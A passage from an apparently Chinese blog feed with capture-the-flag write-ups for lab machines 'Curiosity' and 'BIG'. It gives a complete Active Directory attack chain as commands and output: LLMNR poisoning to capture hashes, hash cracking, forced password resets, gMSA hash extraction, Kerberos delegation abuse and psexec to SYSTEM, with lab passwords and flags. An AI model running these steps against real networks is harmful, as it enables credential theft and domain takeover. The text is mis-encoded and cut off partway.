MAC Address: 08:00:27:4A:93:90 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-09T17:23:46
|_  start_date: 2024-12-09T17:19:49
|_clock-skew: mean: 5h59m57s, deviation: 0s, median: 5h59m57s
|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:4a:93:90 (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.26 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# smbmap -u anonymous -H 192.168.56.8

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>å•¥éƒ½æ²¡æœ‰<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# kerbrute userenum -d hackme.thl --dc dc.hackme.thl  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/09/24 - Ronnie Flathers @ropnop

2024/12/09 19:28:26 &gt;  Using KDC(s):
2024/12/09 19:28:26 &gt;   dc.hackme.thl:88

2024/12/09 19:28:27 &gt;  [+] VALID USERNAME:       administrator@hackme.thl
2024/12/09 19:28:28 &gt;  [+] VALID USERNAME:       osama@hackme.thl
2024/12/09 19:28:29 &gt;  [+] VALID USERNAME:       jdoe@hackme.thl
2024/12/09 19:28:32 &gt;  [+] VALID USERNAME:       Administrator@hackme.thl
2024/12/09 19:28:42 &gt;  [+] VALID USERNAME:       yogesh@hackme.thl
2024/12/09 19:29:56 &gt;  [+] VALID USERNAME:       JDoe@hackme.thl
2024/12/09 19:32:25 &gt;  [+] VALID USERNAME:       appolonia@hackme.thl
2024/12/09 19:32:31 &gt;  [+] VALID USERNAME:       aaren@hackme.thl

<br>å°†è¿™äº›ç”¨æˆ·çš„åå­—æå–å‡ºæ¥ <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# cat kerbrute_users.txt|cut -d ' ' -f14|awk -F  '@hack' '{print $1}' &gt; valid_users.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# cat valid_users.txt
administrator
osama
jdoe
Administrator
yogesh
JDoe
appolonia
aaren

<br>ä½¿ç”¨è¿™äº›ç”¨æˆ·è¿›è¡Œsmbçˆ†ç ´<br>
ä½†æ˜¯å¤±è´¥äº†<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::d4db:8c8a:d91a:fba7 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[SMB] NTLMv2-SSP Client   : fe80::d4db:8c8a:d91a:fba7
[SMB] NTLMv2-SSP Username : hackme\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::hackme:a80ce2dc6617f684:E158321071759A3992DD284245EE2CAE:010100000000000000D712DE744ADB015540EDBF22DC66B3000000000200080056005A004400370001001E00570049004E002D004D00350031004200300047004100480047004D00350004003400570049004E002D004D00350031004200300047004100480047004D0035002E0056005A00440037002E004C004F00430041004C000300140056005A00440037002E004C004F00430041004C000500140056005A00440037002E004C004F00430041004C000700080000D712DE744ADB010600040002000000080030003000000000000000000000000040000086022E48DD6F8D2AB918C5A1878B26B5CABA662847271EF44BE523D72A543E120A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
[+] Exiting...

<br>çˆ†ç ´hash<br>hashcat -a 0 -m 5600 ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt

JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd284245ee2cae:010100000000000000d712de744adb015540edbf22dc66b3000000000200080056005a004400370001001e00570049004e002d004d00350031004200300047004100480047004d00350004003400570049004e002d004d00350031004200300047004100480047004d0035002e0056005a00440037002e004c004f00430041004c000300140056005a00440037002e004c004f00430041004c000500140056005a00440037002e004c004f00430041004c000700080000d712de744adb010600040002000000080030003000000000000000000000000040000086022e48dd6f8d2ab918c5a1878b26b5caba662847271ef44be523d72a543e120a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:$pr1ng@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: JDOE::hackme:a80ce2dc6617f684:e158321071759a3992dd2...000000
Time.Started.....: Mon Dec  9 20:12:40 2024 (0 secs)
Time.Estimated...: Mon Dec  9 20:12:40 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1879.6 kH/s (0.85ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 15%

<br>æˆåŠŸè·å–å¯†ç  $pr1ng@<br><br>åˆ©ç”¨winrmè¿æ¥ä¸Šæ¥-<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# evil-winrm -i 192.168.56.8 -u JDOE -p '$pr1ng@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>çœ‹äº†ä¸€ä¸‹æƒé™ æ²¡æœ‰å•¥å¯ä»¥ç›´æ¥åˆ©ç”¨çš„<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# netexec ldap 192.168.56.8 -u 'jdoe' -p '$pr1ng@'  --bloodhound --collection All --dns-server 192.168.56.8
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.8    389    DC               [+] hackme.thl\jdoe:$pr1ng@
LDAP        192.168.56.8    389    DC               Resolved collection methods: dcom, container, group, trusts, session, acl, rdp, objectprops, psremote, localadmin
LDAP        192.168.56.8    389    DC               Done in 00M 11S
LDAP        192.168.56.8    389    DC               Compressing output into /root/.nxc/logs/DC_192.168.56.8_2024-12-10_023006_bloodhound.zip

<br><img alt="Pasted image 20241209212339" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" referrerpolicy="no-referrer"><br>
<img alt="Pasted image 20241209212314" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212314.png" referrerpolicy="no-referrer"><br>
å¯ä»¥å‘ç° jdoe ç”¨æˆ·æ˜¯ IT ADMIN ç»„çš„æˆå‘˜ï¼Œè€Œè¯¥ç»„çš„æˆåŠŸå¯ä»¥ä¿®æ”¹ DBA_ADM ç”¨æˆ·çš„å¯†ç <br>
ä½†æ˜¯ dba_adm ç”¨æˆ·å¹¶æ²¡æœ‰ç‰¹åˆ«çš„æƒé™ã€‚ä½†æ ¹æ®åå­—å¤§æ¦‚å¯ä»¥æ¨æ–­å‡ºå…¶å…·æœ‰æ•°æ®åº“ç®¡ç†å‘˜çš„æƒé™<br><br>ä½¿ç”¨ impacket-changepasswd ä¿®æ”¹å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# impacket-changepasswd hackme.thl/'dba_adm'@192.168.56.8 -newpass 'admin!@#45' -altuser 'jdoe' -altpass '$pr1ng@' -no-pass -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of hackme.thl\dba_adm as hackme.thl\jdoe
[*] Connecting to DCE/RPC as hackme.thl\jdoe
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

<br>æµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½winrmä¸Šå»<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# evil-winrm -i 192.168.56.8 -u dba_adm -p 'admin!@#45'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt;
<br>å¯ä»¥å‘ç°æ˜¯å­˜åœ¨æ•°æ®åº“æœåŠ¡çš„<br>
<img alt="Pasted image 20241209213951" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209213951.png" referrerpolicy="no-referrer"><br>
è·å–ä¸€ä¸‹æ•°æ®åº“æœåŠ¡åç§°<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS

<br>åç§°æ˜¯ SQLEXPRESS ä½†å®Œæ•´åç§°æ˜¯ DC\SQLEXPRESS<br><br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'select @@version;'

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)


(1 rows affected)

*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S 'DC\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB

(5 rows affected)


<br>é‡Œé¢å‘ç°äº”ä¸ªæ•°æ®åº“ å…¶ä¸­æœ‰ä¸€ä¸ªååˆ†å¯èƒ½æœ‰ä»·å€¼çš„æ•°æ®åº“ CredentialsDB<br>è·å–é‡Œé¢çš„å†…å®¹<br>*Evil-WinRM* PS C:\Users\dba_adm\Documents&gt; sqlcmd -E -S DC\SQLEXPRESS -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
ID          Username                                           Password
----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
          1 sqlsvc                                             23012244084524e51305f015727b890b

(1 rows affected)

<br><br>23012244084524e51305f015727b890b:P@ssword1234!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 23012244084524e51305f015727b890b
Time.Started.....: Mon Dec 09 21:54:01 2024 (0 secs)
Time.Estimated...: Mon Dec 09 21:54:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   101.5 MH/s (1.83ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#2.........:        0 H/s (7.72ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Speed.#*.........:   101.5 MH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1572864/14344387 (10.97%)
Rejected.........: 0/1572864 (0.00%)
Restore.Point....: 0/14344387 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -&gt; lindarox
Candidates.#2....: lindarous -&gt; efesio
Hardware.Mon.#1..: Temp: 40c Util:  9% Core:1890MHz Mem:8000MHz Bus:8
Hardware.Mon.#2..: N/A

Started: Mon Dec 09 21:53:56 2024
Stopped: Mon Dec 09 21:54:03 2024
<br>çˆ†ç ´å‡ºæ¥å¯†ç æ˜¯ P@ssword1234!<br>winrmè¿æ¥ä¸Šå» sqlsvc P@ssword1234!<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br><br><img alt="Pasted image 20241209220120" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220120.png" referrerpolicy="no-referrer"><br>
<img alt="Pasted image 20241209220232" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220232.png" referrerpolicy="no-referrer"><br>
å¯ä»¥å‘ç° SQLSVC ç”¨æˆ·æ˜¯ GMSA_USERS ç”¨æˆ·ç»„çš„æˆå‘˜ï¼Œè€Œæ”¹ç»„çš„æˆå‘˜å¯ä»¥è·å– æœºå™¨ GMSA_SVC$ çš„å¯†ç <br>è·å– GMSA_SVC$ çš„å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nxc ldap 192.168.56.8 -u 'sqlsvc' -p 'P@ssword1234!' --gmsa
SMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
LDAPS       192.168.56.8    636    DC               [+] hackme.thl\sqlsvc:P@ssword1234!
LDAPS       192.168.56.8    636    DC               [*] Getting GMSA Passwords
LDAPS       192.168.56.8    636    DC               Account: GMSA_SVC$            NTLM: b7a596258a854cdcf1d44d42d877c3bb

<br><br><br><img alt="Pasted image 20241209220716" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209220716.png" referrerpolicy="no-referrer"><br>
å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å½“å‰æœºå™¨å¯¹DCå…·æœ‰ AllowedToAct æƒé™ã€‚å³çº¦æŸæ€§å§”æ´¾<br>
æˆ‘ä»¬ä½¿ç”¨åŸŸè´¦æˆ· hackme.thl/GMSA_SVC$ ä¼ªè£…ä¸ºåŸŸç®¡ç†å‘˜ administratorï¼Œå¹¶è·å–ç›®æ ‡æœåŠ¡ cifs/dc.hackme.thl çš„æœåŠ¡ç¥¨æ®ï¼ˆTGSï¼‰ï¼Œç„¶åé€šè¿‡æœåŠ¡ç¥¨æ®æ»¥ç”¨ï¼Œå®ç°å¯¹ç›®æ ‡æœåŠ¡çš„è®¿é—®æƒé™
<br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

<br>
ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå‡ºé”™äº†ï¼ŒåŸå› æ˜¯æ—¶é’Ÿåå·®è¿‡å¤§ï¼ˆClock skew too greatï¼‰ã€‚è¯¥é”™è¯¯é€šå¸¸å‘ç”Ÿåœ¨ Kerberos å®¢æˆ·ç«¯ä¸ KDCï¼ˆKerberos è®¤è¯ä¸­å¿ƒï¼‰ä¹‹é—´çš„æ—¶é—´å·®å¼‚è¶…è¿‡äº† Kerberos åè®®çš„å®¹å¿èŒƒå›´ã€‚
<br>ä½¿ç”¨ rdate åŒæ­¥åŸŸæ—¶é—´<br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# rdate -n 192.168.56.8
Tue Dec 10 05:17:34 CST 2024

â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# impacket-getST -spn cifs/dc.hackme.thl -impersonate administrator -dc-ip 192.168.56.8 'hackme.thl/GMSA_SVC$' -hashes ':b7a596258a854cdcf1d44d42d877c3bb' -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.hackme.thl@HACKME.THL.ccache

<br>è¿™æ ·æˆ‘ä»¬å°±è·å–åˆ°æœåŠ¡å™¨ç®¡ç†å‘˜çš„æœåŠ¡ç¥¨æ®ï¼ˆTGSï¼‰äº†<br>å°†ç¥¨æ®å¯¼å…¥ç¯å¢ƒå˜é‡<br>export KRB5CCNAME=/root/administrator@cifs_dc.hackme.thl@HACKME.THL.ccache
<br>
æ³¨æ„ è¿™é‡Œéœ€è¦å†™ç¥¨æ®çš„ç»å¯¹è·¯å¾„
<br>ç„¶ååˆ©ç”¨ impacket-psexec è¿›è¡ŒPTH<br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# impacket-psexec HACKME.THL/administrator@dc.hackme.thl -k -target-ip 192.168.56.8
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 192.168.56.8.....
[*] Found writable share ADMIN$
[*] Uploading file WroTUHgi.exe
[*] Opening SVCManager on 192.168.56.8.....
[*] Creating service fwyV on 192.168.56.8.....
[*] Starting service fwyV.....
[!] Press help for extra shell commands                                                                                        Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami                                                                                                    nt authority\system


c:\Users&gt; type c:\users\Administrator\desktop\root.txt                                                                       24aff662fbb2ce2ecbf85daa79a396d9

c:\Users&gt; type jdoe\desktop\user.txt                                                                                           bd548d24899423996c68a1a2e1e6bad

]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/5.curiosity.html</link><guid isPermaLink="false">24-æ¸—é€/THL/5.curiosity.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241209212339.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.BIG]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. SMbç©ºä¼šè¯æ£€æµ‹" data-href="#2.2. SMbç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#2.2._SMbç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">2.2. SMbç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="2.3. kerberuteçˆ†ç ´" data-href="#2.3. kerberuteçˆ†ç ´" href="https://www.c1trus.top/about:blank#2.3._kerberuteçˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerberuteçˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="2.4. ç›®å½•æ‰«æ" data-href="#2.4. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.4._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.4. ç›®å½•æ‰«æ</a>


<br><a data-tooltip-position="top" aria-label="3. bigå›¾ç‰‡è§£å¯†" data-href="#3. bigå›¾ç‰‡è§£å¯†" href="https://www.c1trus.top/about:blank#3._bigå›¾ç‰‡è§£å¯†" class="internal-link" target="_self" rel="noopener nofollow">3. bigå›¾ç‰‡è§£å¯†</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a>

<br><a data-tooltip-position="top" aria-label="4.1. åˆ©ç”¨Bloodhoundæ”¶é›†åŸŸå†…ç¯å¢ƒ" data-href="#4.1. åˆ©ç”¨Bloodhoundæ”¶é›†åŸŸå†…ç¯å¢ƒ" href="https://www.c1trus.top/about:blank#4.1._åˆ©ç”¨Bloodhoundæ”¶é›†åŸŸå†…ç¯å¢ƒ" class="internal-link" target="_self" rel="noopener nofollow">4.1. åˆ©ç”¨Bloodhoundæ”¶é›†åŸŸå†…ç¯å¢ƒ</a>
<br><a data-tooltip-position="top" aria-label="4.2. AS-REPRoasting" data-href="#4.2. AS-REPRoasting" href="https://www.c1trus.top/about:blank#4.2._AS-REPRoasting" class="internal-link" target="_self" rel="noopener nofollow">4.2. AS-REPRoasting</a>


<br><a data-tooltip-position="top" aria-label="5. SAMè½¬å‚¨" data-href="#5. SAMè½¬å‚¨" href="https://www.c1trus.top/about:blank#5._SAMè½¬å‚¨" class="internal-link" target="_self" rel="noopener nofollow">5. SAMè½¬å‚¨</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/b-i-g/" target="_blank">https://thehackerslabs.com/b-i-g/</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# fscan -h 192.168.212.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.212.4:445 open
192.168.212.4:139 open
192.168.212.4:80 open
192.168.212.4:88 open
192.168.212.4:135 open
[*] alive ports len is: 5
start vulscan
[*] NetBios 192.168.212.4   [+] DC:BBR\BIG
[*] NetInfo
[*]192.168.212.4
   [-&gt;]BIG
   [-&gt;]192.168.212.4
[*] WebTitle http://192.168.212.4      code:200 len:435    title:None
å·²å®Œæˆ 5/5
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.939563155s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# nmap -sCV 192.168.212.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:00 CST
Nmap scan report for 192.168.212.4
Host is up (0.00026s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn''t have a title (text/html).
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-05 23:00:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:AD:59:C2 (Oracle VirtualBox virtual NIC)
Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-12-05T23:00:19
|_  start_date: 2024-12-05T22:56:51
|_clock-skew: 14h59m57s
|_nbstat: NetBIOS name: BIG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:ad:59:c2 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds

<br>é…ä¸€ä¸‹åŸŸå<br>192.168.212.4  bbr.thl big.bbr.thl
<br>ç½‘ç«™<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# curl http://192.168.212.4
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
        /* It was all a dream */
        body {
            background-image: url('big1.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;h1&gt;Music&lt;/h1&gt;
    &lt;p&gt;I keep it music music, I eat that lunch (Yeah)&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# smbmap -u anonymous -H 192.168.212.4

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

<br>ä¸å­˜åœ¨ smbç©ºä¼šè¯<br><br>å°è¯•kerberute çˆ†ç ´ <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/BIG]
â””â”€# kerbrute userenum -d BBR.BIG.THL  --dc 192.168.212.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
